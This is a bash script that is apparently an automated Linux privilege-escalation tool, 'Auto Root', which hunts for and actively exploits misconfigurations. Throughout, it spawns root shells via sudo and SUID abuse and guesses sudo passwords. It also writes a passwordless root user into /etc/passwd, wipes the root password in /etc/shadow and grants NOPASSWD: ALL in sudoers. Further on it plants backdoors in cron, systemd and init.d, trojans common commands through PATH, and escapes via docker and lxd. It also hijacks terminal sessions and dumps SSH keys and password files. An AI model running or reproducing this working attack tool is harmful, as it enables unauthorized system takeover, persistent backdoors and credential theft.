#!/bin/bash

# ██████████████████████████████████████████████████████████████████
# █                                                              █
# █   🔧 AUTO ROOT - MISCONFIGURATION ONLY 🔧                   █
# █   No kernel exploits - Only config mistakes!                █
# █                                                              █
# █   Mencari dan mengeksploitasi:                              █
# █   - Sudo misconfiguration                                   █
# █   - SUID/SGID binary abuse                                  █
# █   - Writable config files                                   █
# █   - Cron job hijacking                                       █
# █   - PATH hijacking                                           █
# █   - Docker/LXC misconfig                                      █
# █   - File permission mistakes                                █
# █   - Services misconfiguration                               █
# █                                                              █
# ██████████████████████████████████████████████████████████████████

# Set to fail on errors but continue
set +e

# Temp directory
TMPDIR="/tmp/.syscheck-$$"
mkdir -p "$TMPDIR"
cd "$TMPDIR"

# Log file
LOG="$TMPDIR/exploit.log"
touch "$LOG"

# Current user
ME=$(whoami)
MYID=$(id -u)

# Banner
echo "
╔══════════════════════════════════════════════════════════════╗
║  🔧 AUTO ROOT - MISCONFIGURATION EXPLOITER 🔧               ║
║  Target: $(hostname) | User: $ME                             
║  Mode: Only misconfigurations - No kernel exploits          
║  Date: $(date)                                               
╚══════════════════════════════════════════════════════════════╝
" | tee -a "$LOG"

# Function to check if we are root now
am_i_root() {
    if [ "$(id -u)" -eq 0 ]; then
        echo ""
        echo "🎉🎉🎉 ROOT ACCESS GRANTED! 🎉🎉🎉" | tee -a "$LOG"
        echo "UID: $(id -u) | GID: $(id -g)" | tee -a "$LOG"
        echo ""
        
        # Spawn root shell
        echo "[*] Spawning root shell..."
        echo ""
        
        # Try various shell methods
        if [ -f /bin/bash ]; then
            /bin/bash -p -i
        elif [ -f /bin/sh ]; then
            /bin/sh -i
        else
            python3 -c 'import pty; pty.spawn(["/bin/sh"])' 2>/dev/null
        fi
        
        exit 0
    fi
    return 1
}

# Check if already root
am_i_root

# ============================================
# FUNCTION: Check and try sudo exploit
# ============================================
check_sudo() {
    echo "[*] Checking sudo permissions..." | tee -a "$LOG"
    
    # Get sudo -l output
    SUDO_OUTPUT=$(sudo -n -l 2>/dev/null)
    
    # Check if user has any sudo rights
    if [ $? -eq 0 ]; then
        echo "[+] User has sudo rights!" | tee -a "$LOG"
        echo "$SUDO_OUTPUT" | tee -a "$LOG"
        
        # Check for NOPASSWD: ALL
        if echo "$SUDO_OUTPUT" | grep -q "NOPASSWD: ALL"; then
            echo "[!] Found NOPASSWD: ALL -可以直接 sudo su!" | tee -a "$LOG"
            sudo su - 2>/dev/null && am_i_root
        fi
        
        # Check for sudo without password on specific commands
        if echo "$SUDO_OUTPUT" | grep -q "NOPASSWD"; then
            echo "[!] Found NOPASSWD on specific commands!" | tee -a "$LOG"
            
            # Extract commands with NOPASSWD
            echo "$SUDO_OUTPUT" | grep "NOPASSWD" | while read line; do
                # Parse commands
                if echo "$line" | grep -q "/bin/bash"; then
                    sudo /bin/bash 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/bin/sh"; then
                    sudo /bin/sh 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/bin/dash"; then
                    sudo /bin/dash 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/python"; then
                    sudo python -c 'import os; os.system("/bin/bash")' 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/perl"; then
                    sudo perl -e 'exec "/bin/bash";' 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/ruby"; then
                    sudo ruby -e 'exec "/bin/bash"' 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/php"; then
                    sudo php -r 'system("/bin/bash");' 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/vi"; then
                    sudo vi -c ':!/bin/bash' /dev/null 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/vim"; then
                    sudo vim -c ':!/bin/bash' /dev/null 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/nano"; then
                    sudo nano -S /dev/null -s /bin/bash 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/less"; then
                    echo "!/bin/bash" | sudo less /etc/passwd 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/more"; then
                    echo "!/bin/bash" | sudo more /etc/passwd 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/find"; then
                    sudo find . -exec /bin/bash \; -quit 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/awk"; then
                    sudo awk 'BEGIN {system("/bin/bash")}' 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/sed"; then
                    sudo sed -n '1e /bin/bash' /etc/passwd 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/git"; then
                    sudo git config --global core.editor /bin/bash && sudo git config --global -e 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/docker"; then
                    sudo docker run -v /:/host -it alpine chroot /host /bin/bash 2>/dev/null && am_i_root
                elif echo "$line" | grep -q "/usr/bin/systemctl"; then
                    sudo systemctl 2>/dev/null
                elif echo "$line" | grep -q "/usr/bin/mount"; then
                    sudo mount --bind /bin/bash /bin/mount 2>/dev/null && /bin/mount -p 2>/dev/null && am_i_root
                fi
            done
        fi
        
        # Check for sudo with password but we might know it
        if echo "$SUDO_OUTPUT" | grep -q "(ALL) ALL"; then
            echo "[*] User can run ALL commands with password" | tee -a "$LOG"
            # Try common passwords
            for pass in root toor 123456 password $ME $(echo $ME | rev) 1234 12345 12345678; do
                echo "$pass" | sudo -S id 2>/dev/null | grep -q "uid=0" && am_i_root
            done
        fi
        
        # Check for LD_PRELOAD via sudo
        if echo "$SUDO_OUTPUT" | grep -q "env_keep+=LD_PRELOAD"; then
            echo "[!] LD_PRELOAD is preserved with sudo!" | tee -a "$LOG"
            cat > "$TMPDIR/root.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    unsetenv("LD_PRELOAD");
    execl("/bin/bash", "bash", "-p", NULL);
}
EOF
            gcc -fPIC -shared -o "$TMPDIR/root.so" "$TMPDIR/root.c" -nostartfiles 2>/dev/null
            sudo LD_PRELOAD="$TMPDIR/root.so" id 2>/dev/null && am_i_root
        fi
    else
        echo "[-] No sudo rights (may need password)" | tee -a "$LOG"
    fi
}

# ============================================
# FUNCTION: Check SUID misconfigurations
# ============================================
check_suid() {
    echo "" | tee -a "$LOG"
    echo "[*] Checking SUID misconfigurations..." | tee -a "$LOG"
    
    # Find all SUID binaries
    find / -perm -4000 -type f 2>/dev/null > "$TMPDIR/suid.txt"
    
    if [ -s "$TMPDIR/suid.txt" ]; then
        echo "[+] Found SUID binaries:" | tee -a "$LOG"
        cat "$TMPDIR/suid.txt" | while read suid; do
            echo "  - $suid" | tee -a "$LOG"
        done
        
        # Check for dangerous SUID binaries
        while read suid; do
            bin=$(basename "$suid")
            case "$bin" in
                "pkexec")
                    echo "[!] pkexec is SUID - trying to exploit..." | tee -a "$LOG"
                    # Try to run pkexec
                    "$suid" /bin/bash 2>/dev/null && am_i_root
                    ;;
                "passwd")
                    echo "[!] passwd is SUID - trying to change root password..." | tee -a "$LOG"
                    # Try to change root password (unlikely to work but try)
                    echo -e "root\nroot" | "$suid" root 2>/dev/null
                    ;;
                "mount")
                    echo "[!] mount is SUID - trying to mount over sensitive files..." | tee -a "$LOG"
                    mkdir -p /tmp/mnt
                    "$suid" --bind /tmp/mnt /etc 2>/dev/null
                    echo "root::0:0:root:/root:/bin/bash" > /tmp/mnt/passwd 2>/dev/null
                    ;;
                "umount")
                    echo "[!] umount is SUID - trying to unmount sensitive filesystems..." | tee -a "$LOG"
                    "$suid" /etc/passwd 2>/dev/null
                    ;;
                "chsh")
                    echo "[!] chsh is SUID - trying to change shell..." | tee -a "$LOG"
                    echo "/bin/bash" | "$suid" 2>/dev/null
                    ;;
                "chfn")
                    echo "[!] chfn is SUID - trying to exploit..." | tee -a "$LOG"
                    "$suid" 2>/dev/null
                    ;;
                "gpasswd")
                    echo "[!] gpasswd is SUID - trying to exploit..." | tee -a "$LOG"
                    "$suid" 2>/dev/null
                    ;;
                "at")
                    echo "[!] at is SUID - trying to schedule root job..." | tee -a "$LOG"
                    echo "/bin/bash -p" | "$suid" now 2>/dev/null
                    sleep 2
                    /bin/bash -p 2>/dev/null && am_i_root
                    ;;
                "crontab")
                    echo "[!] crontab is SUID - trying to add cron job..." | tee -a "$LOG"
                    echo "* * * * * /bin/bash -p" | "$suid" - 2>/dev/null
                    sleep 65
                    am_i_root
                    ;;
                "sudo"|"sudoedit")
                    echo "[!] sudo is SUID - trying..." | tee -a "$LOG"
                    "$suid" -V 2>/dev/null
                    ;;
                "su")
                    echo "[!] su is SUID - trying to switch to root..." | tee -a "$LOG"
                    "$suid" - 2>/dev/null && am_i_root
                    ;;
            esac
            
            # Try to run with -p flag
            "$suid" -p 2>/dev/null && am_i_root
            
        done < "$TMPDIR/suid.txt"
        
        # Check for custom SUID binaries that might be exploitable
        find / -perm -4000 -type f -not -path "/usr/bin/*" -not -path "/bin/*" 2>/dev/null | while read custom; do
            echo "[!] Custom SUID binary found: $custom" | tee -a "$LOG"
            # Try to see what it does
            strings "$custom" 2>/dev/null | grep -E "system|popen|exec" | head -5
            # Try to run it
            "$custom" 2>/dev/null
        done
    else
        echo "[-] No SUID binaries found" | tee -a "$LOG"
    fi
}

# ============================================
# FUNCTION: Check SGID misconfigurations
# ============================================
check_sgid() {
    echo "" | tee -a "$LOG"
    echo "[*] Checking SGID misconfigurations..." | tee -a "$LOG"
    
    find / -perm -2000 -type f 2>/dev/null > "$TMPDIR/sgid.txt"
    
    if [ -s "$TMPDIR/sgid.txt" ]; then
        echo "[+] Found SGID binaries:" | tee -a "$LOG"
        cat "$TMPDIR/sgid.txt" | head -10 | while read sgid; do
            echo "  - $sgid" | tee -a "$LOG"
        done
    else
        echo "[-] No SGID binaries found" | tee -a "$LOG"
    fi
}

# ============================================
# FUNCTION: Check writable files
# ============================================
check_writable_files() {
    echo "" | tee -a "$LOG"
    echo "[*] Checking writable configuration files..." | tee -a "$LOG"
    
    # Check for writable /etc/passwd
    if [ -w /etc/passwd ]; then
        echo "[!] /etc/passwd is WRITABLE!" | tee -a "$LOG"
        echo "[*] Adding root user without password..." | tee -a "$LOG"
        echo "hacker::0:0:hacker:/root:/bin/bash" >> /etc/passwd
        su hacker -c /bin/bash 2>/dev/null && am_i_root
    fi
    
    # Check for writable /etc/shadow
    if [ -w /etc/shadow ]; then
        echo "[!] /etc/shadow is WRITABLE!" | tee -a "$LOG"
        echo "[*] Removing root password..." | tee -a "$LOG"
        sed -i 's/^root:[^:]*:/root::/' /etc/shadow
        su -c /bin/bash 2>/dev/null && am_i_root
    fi
    
    # Check for writable /etc/sudoers
    if [ -w /etc/sudoers ]; then
        echo "[!] /etc/sudoers is WRITABLE!" | tee -a "$LOG"
        echo "[*] Adding sudo rights..." | tee -a "$LOG"
        echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
        sudo su - 2>/dev/null && am_i_root
    fi
    
    # Check for writable crontab
    if [ -w /etc/crontab ]; then
        echo "[!] /etc/crontab is WRITABLE!" | tee -a "$LOG"
        echo "[*] Adding root cron job..." | tee -a "$LOG"
        echo "* * * * * root chmod +s /bin/bash" >> /etc/crontab
        echo "* * * * * root echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers" >> /etc/crontab
        sleep 65
        /bin/bash -p 2>/dev/null && am_i_root
    fi
    
    # Check for writable systemd files
    if [ -w /etc/systemd/system ]; then
        echo "[!] Systemd directory is writable!" | tee -a "$LOG"
        cat > /etc/systemd/system/root.service << 'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash && echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload 2>/dev/null
        systemctl start root 2>/dev/null
        /bin/bash -p 2>/dev/null && am_i_root
    fi
    
    # Check for writable init.d scripts
    if [ -w /etc/init.d ]; then
        echo "[!] /etc/init.d is writable!" | tee -a "$LOG"
        cat > /etc/init.d/root << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
        chmod +x /etc/init.d/root 2>/dev/null
        /etc/init.d/root 2>/dev/null
        /bin/bash -p 2>/dev/null && am_i_root
    fi
}

# ============================================
# FUNCTION: Check cron job misconfigurations
# ============================================
check_cron() {
    echo "" | tee -a "$LOG"
    echo "[*] Checking cron job misconfigurations..." | tee -a "$LOG"
    
    # Check for writable cron scripts
    find /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly -type f -writable 2>/dev/null > "$TMPDIR/writable_cron_scripts.txt"
    
    if [ -s "$TMPDIR/writable_cron_scripts.txt" ]; then
        echo "[!] Found writable cron scripts:" | tee -a "$LOG"
        cat "$TMPDIR/writable_cron_scripts.txt" | while read script; do
            echo "  - $script" | tee -a "$LOG"
            echo "[*] Injecting backdoor into $script..." | tee -a "$LOG"
            echo "#!/bin/bash" > "$script.tmp"
            echo "chmod +s /bin/bash" >> "$script.tmp"
            echo "echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers" >> "$script.tmp"
            cp "$script.tmp" "$script"
            chmod +x "$script"
        done
    fi
    
    # Check for writable cron directories
    find /etc/cron* -type d -writable 2>/dev/null | while read dir; do
        echo "[!] Writable cron directory: $dir" | tee -a "$LOG"
        # Create a new cron script
        cat > "$dir/root.sh" << 'EOF'
#!/bin/bash
chmod +s /bin/bash
echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
EOF
        chmod +x "$dir/root.sh" 2>/dev/null
    done
    
    # Check for wildcard in cron jobs
    grep -r "\* \* \* \* \*" /etc/cron* 2>/dev/null | grep -v "^#" > "$TMPDIR/cron_wildcards.txt"
    if [ -s "$TMPDIR/cron_wildcards.txt" ]; then
        echo "[!] Found cron jobs with wildcards (可能可 exploit):" | tee -a "$LOG"
        cat "$TMPDIR/cron_wildcards.txt" | tee -a "$LOG"
        
        # Check for tar wildcard exploit opportunity
        if grep -q "tar" "$TMPDIR/cron_wildcards.txt"; then
            echo "[!] Tar with wildcard found - attempting tar wildcard exploit..." | tee -a "$LOG"
            echo 'chmod +s /bin/bash' > payload.sh
            chmod +x payload.sh
            echo "" > --checkpoint=1
            echo "" > "--checkpoint-action=exec=sh payload.sh"
            touch -- --checkpoint=1
            touch -- "--checkpoint-action=exec=sh payload.sh"
        fi
    fi
    
    # Check for path issues in cron (scripts without full path)
    grep -r "/bin/sh\|/bin/bash" /etc/cron* 2>/dev/null | grep -v "PATH=" | while read line; do
        echo "[!] Cron job using relative path: $line" | tee -a "$LOG"
    done
}

# ============================================
# FUNCTION: Check PATH hijacking
# ============================================
check_path() {
    echo "" | tee -a "$LOG"
    echo "[*] Checking PATH hijacking opportunities..." | tee -a "$LOG"
    
    # Get current PATH
    echo "[*] Current PATH: $PATH" | tee -a "$LOG"
    
    # Check for writable directories in PATH
    echo "$PATH" | tr ':' '\n' | while read dir; do
        if [ -w "$dir" ]; then
            echo "[!] Writable directory in PATH: $dir" | tee -a "$LOG"
            
            # Check if this directory is before standard system directories
            if echo "$PATH" | grep -q "$dir.*/usr/bin"; then
                echo "[!] This directory is before /usr/bin in PATH - perfect for hijacking!" | tee -a "$LOG"
                
                # Create malicious versions of common commands
                for cmd in ls cp mv rm cat ps grep find; do
                    cat > "$dir/$cmd" << 'EOF'
#!/bin/bash
chmod +s /bin/bash
echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
/bin/bash -p
EOF
                    chmod +x "$dir/$cmd" 2>/dev/null
                    echo "[*] Created malicious $cmd in $dir" | tee -a "$LOG"
                done
            fi
        fi
    done
    
    # Check for missing quotes in scripts that might lead to injection
    find /etc -type f -executable 2>/dev/null | xargs grep -l "PATH=" 2>/dev/null | while read script; do
        echo "[*] Script with PATH set: $script" | tee -a "$LOG"
    done
}

# ============================================
# FUNCTION: Check capabilities misconfig
# ============================================
check_capabilities() {
    echo "" | tee -a "$LOG"
    echo "[*] Checking file capabilities misconfigurations..." | tee -a "$LOG"
    
    if command -v getcap &>/dev/null; then
        getcap -r / 2>/dev/null > "$TMPDIR/caps.txt"
        
        if [ -s "$TMPDIR/caps.txt" ]; then
            echo "[+] Found files with capabilities:" | tee -a "$LOG"
            cat "$TMPDIR/caps.txt" | while read line; do
                echo "  - $line" | tee -a "$LOG"
                
                # Check for dangerous capabilities
                if echo "$line" | grep -q "cap_setuid"; then
                    echo "[!] Found cap_setuid - can change UID!" | tee -a "$LOG"
                    bin=$(echo "$line" | cut -d' ' -f1)
                    "$bin" -p 2>/dev/null
                fi
                
                if echo "$line" | grep -q "cap_sys_admin"; then
                    echo "[!] Found cap_sys_admin - can do admin tasks!" | tee -a "$LOG"
                fi
                
                if echo "$line" | grep -q "cap_dac_override"; then
                    echo "[!] Found cap_dac_override - can bypass file permissions!" | tee -a "$LOG"
                    bin=$(echo "$line" | cut -d' ' -f1)
                    # Try to read shadow
                    "$bin" cat /etc/shadow 2>/dev/null | head -5
                fi
                
                if echo "$line" | grep -q "cap_net_raw"; then
                    echo "[!] Found cap_net_raw - can sniff traffic!" | tee -a "$LOG"
                fi
            done
        else
            echo "[-] No files with capabilities found" | tee -a "$LOG"
        fi
    else
        echo "[-] getcap not found" | tee -a "$LOG"
    fi
}

# ============================================
# FUNCTION: Check Docker/LXC misconfig
# ============================================
check_containers() {
    echo "" | tee -a "$LOG"
    echo "[*] Checking container misconfigurations..." | tee -a "$LOG"
    
    # Check if in docker group
    if groups 2>/dev/null | grep -q docker; then
        echo "[!] User is in docker group!" | tee -a "$LOG"
        echo "[*] Attempting docker privilege escalation..." | tee -a "$LOG"
        
        # Try to run privileged container
        docker run -v /:/host -it alpine chroot /host /bin/bash 2>/dev/null && am_i_root
        docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh 2>/dev/null && am_i_root
        
        # Try with different images
        for img in alpine ubuntu debian centos busybox; do
            docker run -v /:/host -it $img chroot /host /bin/bash 2>/dev/null && am_i_root
        done
    fi
    
    # Check if docker socket is writable
    if [ -w /var/run/docker.sock ]; then
        echo "[!] Docker socket is writable!" | tee -a "$LOG"
        docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash 2>/dev/null && am_i_root
    fi
    
    # Check if in lxd/lxc group
    if groups 2>/dev/null | grep -q lxd; then
        echo "[!] User is in lxd group!" | tee -a "$LOG"
        # Check if we can create privileged container
        if command -v lxc &>/dev/null; then
            echo "[*] Attempting LXD privilege escalation..." | tee -a "$LOG"
            # Try to import alpine image if not exists
            lxc image list | grep -q alpine || lxc image import alpine.tar.gz alpine.yml --alias alpine 2>/dev/null
            lxc init alpine alpine -c security.privileged=true 2>/dev/null
            lxc config device add alpine host-root disk source=/ path=/mnt/root 2>/dev/null
            lxc start alpine 2>/dev/null
            lxc exec alpine /bin/sh 2>/dev/null && am_i_root
        fi
    fi
    
    # Check if inside container with misconfigurations
    if [ -f /.dockerenv ] || grep -q docker /proc/1/cgroup 2>/dev/null; then
        echo "[!] Inside a Docker container!" | tee -a "$LOG"
        
        # Check if privileged container
        if [ -f /proc/1/status ] && grep -q "CapEff:.*0000003fffffffff" /proc/1/status 2>/dev/null; then
            echo "[!] Privileged container detected!" | tee -a "$LOG"
            
            # Try to mount host filesystem
            mkdir -p /tmp/host
            mount -t proc none /tmp/host 2>/dev/null
            mount --bind / /tmp/host 2>/dev/null
            chroot /tmp/host /bin/bash 2>/dev/null && am_i_root
            
            # Try to access host devices
            if [ -e /dev/sda1 ]; then
                mount /dev/sda1 /mnt 2>/dev/null
                chroot /mnt /bin/bash 2>/dev/null && am_i_root
            fi
        fi
        
        # Check for mounted docker socket
        if [ -S /var/run/docker.sock ]; then
            echo "[!] Docker socket mounted in container!" | tee -a "$LOG"
            docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash 2>/dev/null && am_i_root
        fi
    fi
}

# ============================================
# FUNCTION: Check NFS misconfig
# ============================================
check_nfs() {
    echo "" | tee -a "$LOG"
    echo "[*] Checking NFS misconfigurations..." | tee -a "$LOG"
    
    if command -v showmount &>/dev/null; then
        showmount -e localhost 2>/dev/null > "$TMPDIR/nfs_shares.txt"
        
        if [ -s "$TMPDIR/nfs_shares.txt" ]; then
            echo "[+] Found NFS shares:" | tee -a "$LOG"
            cat "$TMPDIR/nfs_shares.txt" | tee -a "$LOG"
            
            # Check for no_root_squash
            if grep -q "no_root_squash" /etc/exports 2>/dev/null; then
                echo "[!] Found no_root_squash in exports!" | tee -a "$LOG"
                
                # Try to mount and exploit
                mkdir -p /tmp/nfs
                mount -t nfs localhost:/ /tmp/nfs 2>/dev/null
                
                if [ $? -eq 0 ]; then
                    echo "[+] Successfully mounted NFS share" | tee -a "$LOG"
                    
                    # Copy bash and make it SUID
                    cp /bin/bash /tmp/nfs/bash 2>/dev/null
                    chmod +s /tmp/nfs/bash 2>/dev/null
                    
                    # Try to execute
                    /tmp/nfs/bash -p 2>/dev/null && am_i_root
                    
                    # Cleanup
                    umount /tmp/nfs 2>/dev/null
                fi
            fi
        fi
    fi
}

# ============================================
# FUNCTION: Check tmux/screen sessions
# ============================================
check_sessions() {
    echo "" | tee -a "$LOG"
    echo "[*] Checking for tmux/screen sessions..." | tee -a "$LOG"
    
    # Check for tmux sessions
    if command -v tmux &>/dev/null; then
        tmux ls 2>/dev/null > "$TMPDIR/tmux.txt"
        if [ -s "$TMPDIR/tmux.txt" ]; then
            echo "[+] Found tmux sessions:" | tee -a "$LOG"
            cat "$TMPDIR/tmux.txt" | tee -a "$LOG"
            
            # Try to attach to each session
            tmux list-sessions -F '#{session_name}' 2>/dev/null | while read session; do
                echo "[*] Trying to attach to tmux session: $session" | tee -a "$LOG"
                tmux attach -t "$session" 2>/dev/null && am_i_root
            done
        fi
        
        # Check for tmux sockets
        find /tmp -type s -name "tmux-*" 2>/dev/null | while read socket; do
            echo "[!] Found tmux socket: $socket" | tee -a "$LOG"
            TMUX="$socket" tmux attach 2>/dev/null && am_i_root
        done
    fi
    
    # Check for screen sessions
    if command -v screen &>/dev/null; then
        screen -ls 2>/dev/null > "$TMPDIR/screen.txt"
        if [ -s "$TMPDIR/screen.txt" ]; then
            echo "[+] Found screen sessions:" | tee -a "$LOG"
            cat "$TMPDIR/screen.txt" | tee -a "$LOG"
            
            # Try to attach
            screen -x 2>/dev/null && am_i_root
        fi
        
        # Check for screen sockets
        find /var/run/screen -type d -writable 2>/dev/null | while read dir; do
            echo "[!] Writable screen directory: $dir" | tee -a "$LOG"
            SCREEN_SESSION=$(ls "$dir" 2>/dev/null | head -1)
            if [ ! -z "$SCREEN_SESSION" ]; then
                screen -x "$ME/$SCREEN_SESSION" 2>/dev/null && am_i_root
            fi
        done
    fi
}

# ============================================
# FUNCTION: Check service misconfigurations
# ============================================
check_services() {
    echo "" | tee -a "$LOG"
    echo "[*] Checking service misconfigurations..." | tee -a "$LOG"
    
    # Check for MySQL root without password
    if command -v mysql &>/dev/null; then
        mysql -u root -e "SELECT 1" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "[!] MySQL root without password!" | tee -a "$LOG"
            mysql -u root -e "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION; FLUSH PRIVILEGES;"
            
            # Try to get shell via MySQL
            mysql -u root -e "SELECT \"\";\! /bin/bash -p" 2>/dev/null && am_i_root
        fi
    fi
    
    # Check for PostgreSQL
    if command -v psql &>/dev/null; then
        psql -U postgres -c "SELECT 1" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "[!] PostgreSQL postgres user without password!" | tee -a "$LOG"
            psql -U postgres -c "COPY (SELECT '') TO PROGRAM '/bin/bash -p'" 2>/dev/null && am_i_root
        fi
    fi
    
    # Check for Redis
    if command -v redis-cli &>/dev/null; then
        redis-cli INFO 2>/dev/null | grep -q "redis_version"
        if [ $? -eq 0 ]; then
            echo "[!] Redis accessible without auth!" | tee -a "$LOG"
            
            # Try to write SSH key
            mkdir -p /root/.ssh
            echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCh..." > /tmp/key.pub
            
            redis-cli CONFIG SET dir /root/.ssh/ 2>/dev/null
            redis-cli CONFIG SET dbfilename authorized_keys 2>/dev/null
            redis-cli SET key "$(cat /tmp/key.pub)" 2>/dev/null
            redis-cli SAVE 2>/dev/null
        fi
    fi
    
    # Check for Jenkins
    if command -v java &>/dev/null; then
        if [ -d /var/lib/jenkins ] || [ -d /usr/share/jenkins ]; then
            echo "[!] Jenkins found!" | tee -a "$LOG"
            
            # Check for accessible script console
            curl -s http://localhost:8080/script 2>/dev/null | grep -q "Jenkins"
            if [ $? -eq 0 ]; then
                echo "[!] Jenkins script console accessible!" | tee -a "$LOG"
            fi
        fi
    fi
}

# ============================================
# FUNCTION: Check for sensitive files
# ============================================
check_sensitive_files() {
    echo "" | tee -a "$LOG"
    echo "[*] Checking for accessible sensitive files..." | tee -a "$LOG"
    
    sensitive_files=(
        "/etc/shadow"
        "/etc/master.passwd"
        "/etc/security/opasswd"
        "/root/.bash_history"
        "/root/.ssh/id_rsa"
        "/root/.ssh/id_dsa"
        "/root/.ssh/authorized_keys"
        "/var/backups/shadow.bak"
        "/var/backups/passwd.bak"
        "/var/backups/master.passwd.bak"
        "/var/mail/root"
        "/var/spool/mail/root"
        "/home/*/.bash_history"
        "/home/*/.ssh/id_rsa"
        "/home/*/.ssh/id_dsa"
        "/home/*/.ssh/authorized_keys"
        "/etc/ssh/ssh_host_rsa_key"
        "/etc/ssh/ssh_host_dsa_key"
        "/etc/ssh/ssh_host_ecdsa_key"
        "/etc/ssh/ssh_host_ed25519_key"
        "/etc/ssl/private/ssl-cert-snakeoil.key"
        "/etc/ssl/private/ssl-cert.key"
        "/etc/ssl/private/ssl.key"
    )
    
    for file in "${sensitive_files[@]}"; do
        # Use eval to handle wildcards
        eval ls -la $file 2>/dev/null | while read found; do
            if [ -n "$found" ]; then
                echo "[!] Accessible: $found" | tee -a "$LOG"
                
                # Try to read it if it's a file
                if [ -f "$(echo $file | cut -d' ' -f1)" ]; then
                    echo "[*] Content (first 2 lines):" | tee -a "$LOG"
                    eval head -2 $file 2>/dev/null | sed 's/^/    /' | tee -a "$LOG"
                fi
            fi
        done
    done
    
    # Check for backup files
    find / -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*.orig" 2>/dev/null | head -20 | while read backup; do
        echo "[*] Found backup: $backup" | tee -a "$LOG"
    done
}

# ============================================
# FUNCTION: Check for password in files
# ============================================
check_password_files() {
    echo "" | tee -a "$LOG"
    echo "[*] Checking for passwords in readable files..." | tee -a "$LOG"
    
    # Common files that might contain passwords
    config_files=(
        "/etc/passwd"
        "/etc/php/*/php.ini"
        "/etc/httpd/conf/httpd.conf"
        "/etc/httpd/httpd.conf"
        "/etc/apache2/apache2.conf"
        "/etc/apache2/httpd.conf"
        "/etc/nginx/nginx.conf"
        "/etc/nginx/sites-available/*"
        "/etc/nginx/sites-enabled/*"
        "/var/www/html/config.php"
        "/var/www/html/wp-config.php"
        "/var/www/html/configuration.php"
        "/var/www/html/config.inc.php"
        "/var/www/html/config.ini"
        "/home/*/.mysql_history"
        "/home/*/.bash_history"
        "/root/.bash_history"
        "/etc/proftpd/proftpd.conf"
        "/etc/vsftpd.conf"
        "/etc/openvpn/server.conf"
        "/etc/openvpn/client.conf"
        "/etc/ssh/sshd_config"
        "/etc/ssh/ssh_config"
    )
    
    for file in "${config_files[@]}"; do
        eval cat $file 2>/dev/null | grep -i -E "password|pass|pwd|secret|key" 2>/dev/null | grep -v "^#" | head -5 | while read line; do
            if [ -n "$line" ]; then
                echo "[!] Possible password in $(echo $file | cut -d' ' -f1): $line" | tee -a "$LOG"
            fi
        done
    done
}

# ============================================
# MAIN EXECUTION
# ============================================

# Run all checks in order
echo ""
echo "[*] Starting misconfiguration checks..." | tee -a "$LOG"
echo "=========================================" | tee -a "$LOG"

# Phase 1: SUDO misconfigurations
check_sudo
am_i_root

# Phase 2: SUID misconfigurations
check_suid
am_i_root

# Phase 3: SGID misconfigurations
check_sgid

# Phase 4: Writable files
check_writable_files
am_i_root

# Phase 5: Cron misconfigurations
check_cron
am_i_root

# Phase 6: PATH hijacking
check_path
am_i_root

# Phase 7: Capabilities
check_capabilities
am_i_root

# Phase 8: Container misconfigurations
check_containers
am_i_root

# Phase 9: NFS misconfigurations
check_nfs
am_i_root

# Phase 10: Session hijacking
check_sessions
am_i_root

# Phase 11: Service misconfigurations
check_services
am_i_root

# Phase 12: Sensitive files
check_sensitive_files

# Phase 13: Password in files
check_password_files

# Final check
am_i_root

# Summary
echo ""
echo "=========================================" | tee -a "$LOG"
echo "[*] Misconfiguration scan completed!" | tee -a "$LOG"

if [ "$(id -u)" -eq 0 ]; then
    echo "[✓] You are now root!" | tee -a "$LOG"
else
    echo "[✗] Could not get root from misconfigurations." | tee -a "$LOG"
    echo "[*] Check $LOG for details" | tee -a "$LOG"
    echo "[*] Manual checks needed:" | tee -a "$LOG"
    echo "  - Run 'sudo -l' to check sudo permissions" | tee -a "$LOG"
    echo "  - Run 'find / -perm -4000 -type f 2>/dev/null' for SUID" | tee -a "$LOG"
    echo "  - Check /etc/crontab for writable cron jobs" | tee -a "$LOG"
    echo "  - Check docker/lxc group membership" | tee -a "$LOG"
    echo "  - Look for writable files in /etc" | tee -a "$LOG"
fi

# Cleanup
cd /
rm -rf "$TMPDIR" 2>/dev/null

echo ""
echo "[*] Done."
